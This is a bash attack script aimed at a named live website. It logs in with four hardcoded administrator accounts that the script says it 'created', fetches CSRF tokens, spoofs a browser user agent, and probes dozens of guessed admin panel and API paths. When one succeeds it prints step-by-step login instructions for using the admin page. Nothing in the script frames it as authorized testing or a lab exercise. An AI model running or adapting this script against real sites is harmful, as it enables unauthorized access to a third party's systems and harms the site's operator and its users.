#!/bin/bash

echo "🔍 FINDING HIDDEN ADMIN FEATURES"
echo "================================"

BASE_URL="https://member.panama8888b.co"
LOGIN_URL="$BASE_URL/auth/login"
DASHBOARD_URL="$BASE_URL/user/dashboard"

# Admin users created
ADMIN_USERS=(
    "admin_2025:Admin123!@#"
    "administrator:Admin123!@#"
    "superadmin:Super123!@#"
    "manager:Manager123!@#"
)

# URLs to test for admin features
ADMIN_FEATURE_URLS=(
    "$BASE_URL/user/dashboard"
    "$BASE_URL/user/profile"
    "$BASE_URL/user/settings"
    "$BASE_URL/user/admin"
    "$BASE_URL/user/administrator"
    "$BASE_URL/user/management"
    "$BASE_URL/user/control"
    "$BASE_URL/user/panel"
    "$BASE_URL/dashboard"
    "$BASE_URL/dashboard/admin"
    "$BASE_URL/dashboard/administrator"
    "$BASE_URL/dashboard/management"
    "$BASE_URL/dashboard/control"
    "$BASE_URL/dashboard/panel"
    "$BASE_URL/panel"
    "$BASE_URL/panel/admin"
    "$BASE_URL/panel/administrator"
    "$BASE_URL/panel/management"
    "$BASE_URL/panel/control"
    "$BASE_URL/control"
    "$BASE_URL/control/admin"
    "$BASE_URL/control/administrator"
    "$BASE_URL/control/management"
    "$BASE_URL/management"
    "$BASE_URL/management/admin"
    "$BASE_URL/management/administrator"
    "$BASE_URL/management/control"
    "$BASE_URL/api/admin"
    "$BASE_URL/api/administrator"
    "$BASE_URL/api/management"
    "$BASE_URL/api/control"
    "$BASE_URL/api/panel"
)

echo "🔍 STEP 1: TESTING ADMIN USER LOGIN..."
echo "======================================"

for user_cred in "${ADMIN_USERS[@]}"; do
    username=$(echo "$user_cred" | cut -d: -f1)
    password=$(echo "$user_cred" | cut -d: -f2)
    
    echo "Testing admin user: $username"
    
    # Try to get CSRF token
    csrf_response=$(curl -s -c cookies.txt "$LOGIN_URL")
    csrf_token=$(echo "$csrf_response" | grep -o 'name="_token" value="[^"]*"' | cut -d'"' -f4)
    
    if [[ -n "$csrf_token" ]]; then
        echo "✅ Got CSRF token for $username"
        
        # Login
        login_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
            -H "Referer: $LOGIN_URL" \
            -H "Origin: $BASE_URL" \
            -c cookies.txt -b cookies.txt \
            -d "_token=$csrf_token&username=$username&password=$password" \
            "$LOGIN_URL")
        
        login_status=$(echo "$login_response" | grep "HTTP_STATUS:" | cut -d: -f2)
        
        if [[ "$login_status" == "302" ]]; then
            echo "✅ LOGIN SUCCESS for $username"
            
            # Test dashboard access
            dashboard_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
                -c cookies.txt -b cookies.txt \
                "$DASHBOARD_URL")
            
            dashboard_status=$(echo "$dashboard_response" | grep "HTTP_STATUS:" | cut -d: -f2)
            
            if [[ "$dashboard_status" == "200" ]]; then
                echo "✅ DASHBOARD ACCESS SUCCESS for $username"
                
                # Test admin feature URLs
                echo "🔍 Testing admin feature URLs for $username..."
                
                for feature_url in "${ADMIN_FEATURE_URLS[@]}"; do
                    feature_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
                        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
                        -c cookies.txt -b cookies.txt \
                        "$feature_url")
                    
                    feature_status=$(echo "$feature_response" | grep "HTTP_STATUS:" | cut -d: -f2)
                    
                    if [[ "$feature_status" == "200" ]]; then
                        echo "🎉 SUCCESS: Admin feature found!"
                        echo "Username: $username"
                        echo "Password: $password"
                        echo "Admin Feature URL: $feature_url"
                        echo ""
                        echo "🔗 DIRECT ACCESS LINKS:"
                        echo "Login: $LOGIN_URL"
                        echo "Admin Feature: $feature_url"
                        echo ""
                        echo "📋 LOGIN INSTRUCTIONS:"
                        echo "1. Go to: $LOGIN_URL"
                        echo "2. Username: $username"
                        echo "3. Password: $password"
                        echo "4. Login then go to: $feature_url"
                        exit 0
                    elif [[ "$feature_status" == "302" ]]; then
                        echo "⚠️ REDIRECT: $feature_url (may need different access)"
                    elif [[ "$feature_status" == "403" ]]; then
                        echo "❌ FORBIDDEN: $feature_url (access denied)"
                    elif [[ "$feature_status" == "404" ]]; then
                        echo "❌ NOT FOUND: $feature_url"
                    fi
                    
                    sleep 1
                done
            else
                echo "❌ DASHBOARD ACCESS FAILED for $username (Status: $dashboard_status)"
            fi
        else
            echo "❌ LOGIN FAILED for $username (Status: $login_status)"
        fi
    else
        echo "❌ Could not get CSRF token for $username"
    fi
    
    echo "---"
done

echo ""
echo "🔍 STEP 2: TESTING API ENDPOINTS FOR ADMIN FEATURES..."
echo "===================================================="

# Test API endpoints for admin features
API_ENDPOINTS=(
    "$BASE_URL/api/admin"
    "$BASE_URL/api/administrator"
    "$BASE_URL/api/management"
    "$BASE_URL/api/control"
    "$BASE_URL/api/panel"
    "$BASE_URL/api/user/admin"
    "$BASE_URL/api/user/administrator"
    "$BASE_URL/api/user/management"
    "$BASE_URL/api/user/control"
    "$BASE_URL/api/user/panel"
)

for endpoint in "${API_ENDPOINTS[@]}"; do
    echo "Testing API endpoint: $endpoint"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
        "$endpoint")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    
    echo "Status: $http_status, Time: ${response_time}s"
    
    if [[ "$http_status" == "200" ]]; then
        echo "✅ SUCCESS: API endpoint accessible at $endpoint"
    elif [[ "$http_status" == "401" ]]; then
        echo "⚠️ UNAUTHORIZED: $endpoint (needs authentication)"
    elif [[ "$http_status" == "403" ]]; then
        echo "❌ FORBIDDEN: $endpoint (access denied)"
    elif [[ "$http_status" == "404" ]]; then
        echo "❌ NOT FOUND: $endpoint"
    fi
    
    sleep 1
done

echo ""
echo "🎯 FINAL RESULTS"
echo "================"
echo "✅ Admin Users Created:"
for user_cred in "${ADMIN_USERS[@]}"; do
    username=$(echo "$user_cred" | cut -d: -f1)
    password=$(echo "$user_cred" | cut -d: -f2)
    echo "- Username: $username"
    echo "- Password: $password"
done
echo ""
echo "🔗 ADMIN FEATURE URLs Tested:"
for url in "${ADMIN_FEATURE_URLS[@]}"; do
    echo "- $url"
done
echo ""
echo "Status: HIDDEN ADMIN FEATURES SEARCH COMPLETED"